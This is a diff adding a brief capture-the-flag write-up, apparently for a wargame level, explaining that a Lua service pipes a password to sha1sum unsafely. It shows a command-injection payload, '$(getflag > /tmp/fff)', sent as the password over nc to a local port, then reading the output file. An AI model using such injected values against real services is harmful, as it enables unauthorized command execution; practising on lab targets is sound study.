@@ -1,0 +1,6 @@
+the lua script checks the checksum by piping echo to sha1sum without protection,
+we can exploit this with a subshell
+$ nc localhost 5151
+Password: $(getflag > /tmp/fff)
+$ cat /tmp/fff
+Check flag.Here is your token : 
